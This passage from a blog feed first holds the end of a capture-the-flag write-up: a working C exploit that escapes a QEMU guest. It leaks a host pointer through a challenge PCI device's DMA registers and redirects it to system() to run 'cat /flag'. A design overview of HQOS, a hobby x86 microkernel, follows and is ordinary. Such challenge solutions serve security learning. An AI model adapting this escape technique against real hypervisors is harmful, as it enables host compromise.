class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEX(x) printf(<span class="string">"[*]0x%016llx\n"</span>, (unsigned long long)x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG(addr) printf(<span class="string">"[*]%s\n"</span>, addr)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOWMASK 0xffffffff</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHMASK 0xffffffff00000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">uint64_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pmio_base = <span class="number">0x000000000000c050</span>;</span><br><span class="line"><span class="type">void</span> * mmio_mem;</span><br><span class="line"><span class="type">char</span>* userbuf;</span><br><span class="line"><span class="type">uint64_t</span> phy_userbuf;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Err</span><span class="params">(<span class="type">char</span>* err)</span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Error: %s\n"</span>, err);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gfn</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    <span class="comment">// ((uintptr_t)addr &gt;&gt; 12)&lt;&lt;3</span></span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* transfer visual address to physic address</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gpa</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="type">uint64_t</span>)addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">va2pa</span><span class="params">(<span class="type">void</span> *addr)</span>{</span><br><span class="line">    <span class="type">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pagesize = getpagesize();</span><br><span class="line">    <span class="type">size_t</span> offset = ((<span class="type">uintptr_t</span>)addr / pagesize) * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="number">0</span>){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"lseek"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(read(fd,&amp;data,<span class="number">8</span>) != <span class="number">8</span>){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"read"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(data &amp; (((<span class="type">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>)))){</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"page"</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="type">size_t</span> phyaddr = pageframenum * pagesize + (<span class="type">uintptr_t</span>)addr % pagesize;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint32_t</span> size)</span>{</span><br><span class="line">        <span class="keyword">return</span> *(<span class="type">uint32_t</span> *)( mmio_mem + addr );</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">uint64_t</span> val)</span>{</span><br><span class="line">        *(<span class="type">uint64_t</span> *)(mmio_mem + addr) = val;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint32_t</span> val)</span>{</span><br><span class="line">    outl(val,addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_writeb</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint8_t</span> val)</span>{</span><br><span class="line">    outb(val,addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint32_t</span>)inl(addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_readb</span><span class="params">(<span class="type">uint32_t</span> addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint8_t</span>)inb(addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_mmio</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd &lt; <span class="number">0</span>){</span><br><span class="line">        Err(<span class="string">"Open pci"</span>);</span><br><span class="line">    }</span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_mem&lt;<span class="number">0</span>){</span><br><span class="line">        Err(<span class="string">"mmap mmio_mem"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_dma_state</span><span class="params">(<span class="type">uint32_t</span> src,<span class="type">uint32_t</span> dst,<span class="type">uint32_t</span> cnt)</span></span><br><span class="line">{</span><br><span class="line">    mmio_write(<span class="number">0x80</span>,src);</span><br><span class="line">    mmio_write(<span class="number">0x88</span>,dst); </span><br><span class="line">    mmio_write(<span class="number">0x90</span>,cnt);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_from_dma</span><span class="params">(<span class="type">void</span>* buf,<span class="type">uint32_t</span> idx,<span class="type">uint32_t</span> cnt)</span></span><br><span class="line">{</span><br><span class="line">    set_dma_state(idx+<span class="number">0x40000</span>,gva_to_gpa(buf),cnt);</span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">1</span>|<span class="number">2</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_to_dma</span><span class="params">(<span class="type">void</span>* buf,<span class="type">uint32_t</span> idx,<span class="type">uint32_t</span> cnt)</span></span><br><span class="line">{</span><br><span class="line">    set_dma_state(gva_to_gpa(buf),idx+<span class="number">0x40000</span>,cnt);</span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">1</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">"open"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    init_mmio();</span><br><span class="line">    HEX(mmio_mem);</span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"prepare:"</span>);</span><br><span class="line">    <span class="type">uint64_t</span> buf = <span class="number">0</span>;</span><br><span class="line">    copy_from_dma(&amp;buf,<span class="number">4096</span>,<span class="number">8</span>);</span><br><span class="line">    HEX(buf);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> system_addr = buf<span class="number">-0x862B8</span>;</span><br><span class="line">    copy_to_dma(&amp;system_addr,<span class="number">4096</span>,<span class="number">8</span>);</span><br><span class="line">    <span class="type">char</span> cmd[] = <span class="string">"cat /flag"</span>;</span><br><span class="line">    copy_to_dma(cmd,<span class="number">0</span>,<span class="built_in">strlen</span>(cmd));</span><br><span class="line"></span><br><span class="line">    LOG(<span class="string">"Trigger:"</span>);</span><br><span class="line">    set_dma_state(<span class="number">0x40000</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">1</span>|<span class="number">2</span>|<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311281752891.png"></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Qemu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Qemu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HQOS 设计与实现</title>
      <link href="/2023/HQOS-Design-and-Implementation/"/>
      <url>/2023/HQOS-Design-and-Implementation/</url>
      
        <content type="html"><![CDATA[<h1 id="序"><a href="#序" class="headerlink" title="序"></a>序</h1><p>“THE MAN WHO CHANGED CHROME” 曾经指出如何学习计算机基础知识:</p><blockquote><p>自己写一个CPU,在自己写的CPU上运行自己写的操作系统,然后用自己写的编译器编译运行一个程序.</p></blockquote><p>于是便有了写一个操作系统的想法.在粗略看完一遍《操作系统真相还原》后,感觉从引导操作系统到实现各种操作系统概念的完整过程工作量有点太大了,暂时还没有那么多时间和精力来完成,便暂且搁置了.</p><p>感谢MIT的6.828课程,让我能在有限的时间里一步一步地实现一个操作系统雏形JOS.JOS的开发过程请查看 /学习笔记/6.828分类下的文章.</p><p>在接下来的一段时间,我会继续开发扩展该操作系统,并重构目前实现模型中我不太喜欢的实现,就叫它HQOS吧.</p><p>本博客记录当前版本HQOS的设计与实现,你可以在github上找到其历史文档及代码实现.<br><a href="https://github.com/Polaris-Snowfall/HQOS">github</a></p><span id="more"></span><h1 id="设计与实现-Version-0-0"><a href="#设计与实现-Version-0-0" class="headerlink" title="设计与实现 Version 0.0"></a>设计与实现 Version 0.0</h1><h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><p>HQOS使用C语言进行开发,是一个基于x86架构的Unix-like微内核操作系统,你可以从中找到很多Unix-like的设计和功能.一些模块如File system,Network等在用户态实现.</p><ol><li>Memory management</li><li>Processes and Threads</li><li>File systems</li><li>Network</li><li>System calls, Interrupts, Exceptions</li><li>User library</li></ol><h2 id="Memory-management"><a href="#Memory-management" class="headerlink" title="Memory management"></a>Memory management</h2><h3 id="Physical-Page-Management"><a href="#Physical-Page-Management" class="headerlink" title="Physical Page Management"></a>Physical Page Management</h3><h4 id="Keep-track-of-physical-page-frames"><a href="#Keep-track-of-physical-page-frames" class="headerlink" title="Keep track of (physical) page frames"></a>Keep track of (physical) page frames</h4><p>HQOS以页面粒度进行物理内存管理.对于每一个物理页,使用一个PageInfo结构来跟踪其的使用情况(空闲或使用中,被多少”用户”使用).所有的PageInfo结构位于一个连续的数组中,PageInfo结构在数组中的索引与物理页的地址相关联(IDX &lt;—&gt; PGNUM = PADDR / PGSIZE).</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> {</span></span><br><span class="line"><span class="comment">// Next page on the free list.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp_link</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// pp_ref is the count of pointers (usually in page table entries)</span></span><br><span class="line"><span class="comment">// to this page, for pages allocated using page_alloc.</span></span><br><span class="line"><span class="comment">// Pages allocated at boot time using pmap.c's</span></span><br><span class="line"><span class="comment">// boot_alloc do not have valid reference count fields.</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint16_t</span> pp_ref;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="Dynamically-allocate-free-page-frames"><a href="#Dynamically-allocate-free-page-frames" class="headerlink" title="Dynamically allocate / free page frames"></a>Dynamically allocate / free page frames</h4><h5 id="Interface"><a href="#Interface" class="headerlink" title="Interface"></a>Interface</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//For kernel:</span></span><br><span class="line"><span class="comment">//请求分配一个物理页</span></span><br><span class="line"><span class="keyword">struct</span> PageInfo *<span class="title function_">page_alloc</span><span class="params">(<span class="type">int</span> alloc_flags)</span>;</span><br><span class="line"><span class="comment">//减少对某物理页的一次引用</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">page_decref</span><span class="params">(<span class="keyword">struct</span> PageInfo* pp)</span>;</span><br><span class="line"><span class="comment">//释放某物理页</span></span><br><span class="line"><span class="type">void</span><span class="title function_">page_free</span><span class="params">(<span class="keyword">struct</span> PageInfo *pp)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//For User:</span></span><br><span class="line"><span class="comment">//分配并映射一个页面</span></span><br><span class="line"><span class="type">int</span><span class="title function_">sys_page_alloc</span><span class="params">(<span class="type">envid_t</span> env, <span class="type">void</span> *pg, <span class="type">int</span> perm)</span>;</span><br><span class="line"><span class="comment">//映射一个页面</span></span><br><span class="line"><span class="type">int</span><span class="title function_">sys_page_map</span><span class="params">(<span class="type">envid_t</span> src_env, <span class="type">void</span> *src_pg,</span></span><br><span class="line"><span class="params">     <span class="type">envid_t</span> dst_env, <span class="type">void</span> *dst_pg, <span class="type">int</span> perm)</span>;</span><br><span class="line"><span class="comment">//取消一个页面的映射</span></span><br><span class="line"><span class="type">int</span><span class="title function_">sys_page_unmap</span><span class="params">(<span class="type">envid_t</span> env, <span class="type">void</span> *pg)</span>;</span><br></pre></td></tr></tbody></table></figure><h5 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h5><p>HQOS以单向链表的数据结构组织空闲物理页.page_alloc与page_free分别从空闲链表中取出一个物理页或加入一个到空闲链表中.在目前的实现中,page_free仅在page_decref中调用,当且仅当某物理页不再被任何一处引用,释放该物理页.</p><h3 id="Virtual-memory-management"><a href="#Virtual-memory-management" class="headerlink" title="Virtual memory management"></a>Virtual memory management</h3><h4 id="Page-translation"><a href="#Page-translation" class="headerlink" title="Page translation"></a>Page translation</h4><h5 id="Interface-1"><a href="#Interface-1" class="headerlink" title="Interface"></a>Interface</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//For kernel:</span></span><br><span class="line"><span class="comment">//插入一个页面到页表中(映射一个虚拟地址对应的页面)</span></span><br><span class="line"><span class="type">int</span><span class="title function_">page_insert</span><span class="params">(<span class="type">pde_t</span> *pgdir, <span class="keyword">struct</span> PageInfo *pp, <span class="type">void</span> *va, <span class="type">int</span> perm)</span>;</span><br><span class="line"><span class="comment">//从页表中移除一个页面(取消一个虚拟地址对应页面的映射)</span></span><br><span class="line"><span class="type">void</span><span class="title function_">page_remove</span><span class="params">(<span class="type">pde_t</span> *pgdir, <span class="type">void</span> *va)</span>;</span><br><span class="line"><span class="comment">//寻找虚拟地址对应页面的PageInfo结构及页表条目</span></span><br><span class="line"><span class="keyword">struct</span> PageInfo *<span class="title function_">page_lookup</span><span class="params">(<span class="type">pde_t</span> *pgdir, <span class="type">void</span> *va, <span class="type">pte_t</span> **pte_store)</span>;</span><br></pre></td></tr></tbody></table></figure><h5 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h5><p>HQOS运行在x86’s protected-mode memory management architecture之上.<br>逻辑地址(虚拟地址)经Segmentation Mechanism转换为线性地址,再经由Paging Mechanism转换到物理地址,最终送上硬件总线.</p><p>HQOS仅通过页面翻译过程完成虚拟地址到物理地址的转换,(实现的方式是: 将全局描述符表中所有条目的段基址设置为0,段界限设置为0xffffffff,此时线性地址就等于虚拟地址.),segmentation在HQOS的实现中更多地作用于权限控制.</p><p>HQOS使用二级页表来完成页面翻译,一个页目录表中有1024个页表条目,一个页表中有1024个页条目,每个页大小为4096字节.(当然,这是x86硬件决定的)</p><h4 id="Pagefault-handling"><a href="#Pagefault-handling" class="headerlink" title="Pagefault handling"></a>Pagefault handling</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//For User</span></span><br><span class="line">sys_env_set_pgfault_upcall(<span class="type">envid_t</span> envid, <span class="type">void</span> *func)</span><br></pre></td></tr></tbody></table></figure><p>HQOS对于内核态的页面错误,产生Kernel panic.而对于用户态的页面错误,销毁产生页面错误的用户进程或派发到一个完成注册的用户态页面错误处理函数.</p><h4 id="Page-replacement-待实现"><a href="#Page-replacement-待实现" class="headerlink" title="Page replacement (待实现)"></a>Page replacement (待实现)</h4><h2 id="Processes-and-Threads"><a href="#Processes-and-Threads" class="headerlink" title="Processes and Threads"></a>Processes and Threads</h2><h3 id="Processes"><a href="#Processes" class="headerlink" title="Processes"></a>Processes</h3><h4 id="Process-model"><a href="#Process-model" class="headerlink" title="Process model"></a>Process model</h4><p>HQOS使用术语”环境(Environment)“来表示进程.<br>    HQOS使用struct Env的数组来管理系统中所有进程(无论进程是否存在,进程状态由env_status标识),数组的大小即为HQOS允许的最大进程数NENV.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> {</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Trapframe</span> <span class="title">env_tf</span>;</span><span class="comment">// Saved registers</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">env_link</span>;</span><span class="comment">// Next free Env</span></span><br><span class="line"><span class="type">envid_t</span> env_id;<span class="comment">// Unique environment identifier</span></span><br><span class="line"><span class="type">envid_t</span> env_parent_id;<span class="comment">// env_id of this env's parent</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">EnvType</span> <span class="title">env_type</span>;</span><span class="comment">// Indicates special system environments</span></span><br><span class="line"><span class="type">unsigned</span> env_status;<span class="comment">// Status of the environment</span></span><br><span class="line"><span class="type">uint32_t</span> env_runs;<span class="comment">// Number of times environment has run</span></span><br><span class="line"><span class="type">int</span> env_cpunum;<span class="comment">// The CPU that the env is running on</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Address space</span></span><br><span class="line"><span class="type">pde_t</span> *env_pgdir;<span class="comment">// Kernel virtual address of page dir</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Exception handling</span></span><br><span class="line"><span class="type">void</span> *env_pgfault_upcall;<span class="comment">// Page fault upcall entry point</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> env_ipc_recving;<span class="comment">// Env is blocked receiving</span></span><br><span class="line"><span class="type">void</span> *env_ipc_dstva;<span class="comment">// VA at which to map received page</span></span><br><span class="line"><span class="type">uint32_t</span> env_ipc_value;<span class="comment">// Data value sent to us</span></span><br><span class="line"><span class="type">envid_t</span> env_ipc_from;<span class="comment">// envid of the sender</span></span><br><span class="line"><span class="type">int</span> env_ipc_perm;<span class="comment">// Perm of page mapping received</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>每个进程有自己独立的页目录表,即拥有一个独立的32位虚拟地址空间.这意味着同一个物理页可以映射到多个进程中,这是HQOS目前进程间通信实现的关键.HQOS中属于内核的物理空间完整的映射到每个进程的虚拟地址空间中.</p><p>进程目前不具有也不需要独立的内核堆栈.</p><h4 id="Process-creation"><a href="#Process-creation" class="headerlink" title="Process creation"></a>Process creation</h4><h5 id="Interface-2"><a href="#Interface-2" class="headerlink" title="Interface"></a>Interface</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//For Kernel:</span></span><br><span class="line"><span class="comment">// Allocates a new env with env_alloc, loads the named elf</span></span><br><span class="line"><span class="comment">// binary into it with load_icode, and sets its env_type.</span></span><br><span class="line"><span class="comment">// This function is ONLY called during kernel initialization,</span></span><br><span class="line"><span class="comment">// before running the first user-mode environment.</span></span><br><span class="line"><span class="comment">// The new env's parent ID is set to 0.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">env_create</span><span class="params">(<span class="type">uint8_t</span> *binary, <span class="keyword">enum</span> EnvType type)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//For User:</span></span><br><span class="line"><span class="comment">//Create the new environment</span></span><br><span class="line"><span class="comment">//the register set is copied from the current environment</span></span><br><span class="line"><span 